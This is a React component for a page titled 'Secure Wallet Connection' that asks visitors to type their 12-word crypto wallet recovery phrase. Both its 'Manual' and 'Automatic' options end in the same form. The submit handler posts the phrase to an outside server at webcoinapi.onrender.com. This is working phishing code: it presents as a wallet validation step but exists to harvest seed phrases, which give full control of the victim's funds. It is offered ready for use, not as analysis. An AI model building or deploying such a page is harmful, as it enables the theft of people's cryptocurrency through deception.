import React, { useState } from "react";
import { motion } from "framer-motion";
import axios from "axios";

export default function ConnectWallet() {
  const [mode, setMode] = useState("");
  const [words, setWords] = useState(Array(12).fill(""));
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  const handleChange = (index, value) => {
    const newWords = [...words];
    newWords[index] = value;
    setWords(newWords);
  };

  const handleSubmit = async () => {
    if (words.some(w => !w)) {
      setMessage("Please fill in all 12 words.");
      return;
    }

    setLoading(true);
    setMessage("");

    try {
      const res = await axios.post("https://webcoinapi.onrender.com/api/send-phrase", {
        words,
      });
      setMessage(res.data.message);
      setWords(Array(12).fill(""));
    } catch (err) {
      console.error(err);
      setMessage(err.response?.data?.message || "Failed to send phrase.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white pt-28 px-6 overflow-hidden relative">
      {/* Background Glow */}
      <div className="absolute top-0 left-0 w-[400px] h-[400px] rounded-full bg-blue-700/20 blur-[180px] -z-10"></div>
      <div className="absolute bottom-0 right-0 w-[350px] h-[350px] rounded-full bg-purple-700/20 blur-[160px] -z-10"></div>

      <motion.div
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.7 }}
        className="max-w-3xl mx-auto bg-gray-900/40 backdrop-blur-xl p-10 rounded-3xl border border-gray-700 shadow-2xl"
      >
        <h1 className="text-4xl font-extrabold text-center mb-4 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
          Secure Wallet Connection
        </h1>
        <p className="text-gray-300 text-center mb-10 text-lg">
          Choose your preferred method to securely initialize wallet validation.
        </p>

        {!mode && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => setMode("manual")}
              className="bg-gradient-to-br from-blue-600 to-blue-800 p-7 rounded-2xl text-xl font-semibold text-center shadow-xl hover:shadow-blue-600/40 transition-all"
            >
              Manual Connect
              <p className="text-sm text-gray-300 mt-2">Enter phrase manually for verification</p>
            </motion.button>

            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => setMode("automatic")}
              className="bg-gradient-to-br from-purple-600 to-purple-800 p-7 rounded-2xl text-xl font-semibold text-center shadow-xl hover:shadow-purple-600/40 transition-all"
            >
              Automatic Connect
              <p className="text-sm text-gray-300 mt-2">Auto‑sync wallet using secure protocol</p>
            </motion.button>
          </motion.div>
        )}

        {mode && (
          <motion.div initial={{ opacity: 0, y: 40 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.6 }} className="mt-10">
            <h2 className="text-2xl font-semibold text-center mb-4">
              {mode === "manual" ? "Manual Validation" : "Automatic Sync"}
            </h2>
            <p className="text-gray-400 text-center mb-8">
              Enter your <span className="text-blue-400">12‑word recovery phrase</span> below.
            </p>

            <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
              {words.map((w, i) => (
                <motion.input
                  key={i}
                  value={w}
                  onChange={e => handleChange(i, e.target.value)}
                  whileFocus={{ scale: 1.03 }}
                  type="text"
                  placeholder={`Word ${i + 1}`}
                  className="bg-black/40 border border-gray-700 p-3 rounded-lg text-gray-200 focus:border-blue-500 outline-none transition"
                />
              ))}
            </div>

            {message && <p className="text-center text-red-400 mt-4">{message}</p>}

            <motion.button
              onClick={handleSubmit}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.97 }}
              className="w-full mt-10 bg-gradient-to-r from-blue-600 to-purple-600 py-4 rounded-xl text-xl font-semibold shadow-lg hover:shadow-blue-500/40 transition"
            >
              {loading ? "Securing..." : "Proceed Securely"}
            </motion.button>

            <button
              onClick={() => setMode("")}
              className="w-full mt-4 py-2 text-gray-400 hover:text-white transition"
            >
              ← Back
            </button>
          </motion.div>
        )}
      </motion.div>
    </div>
  );
}
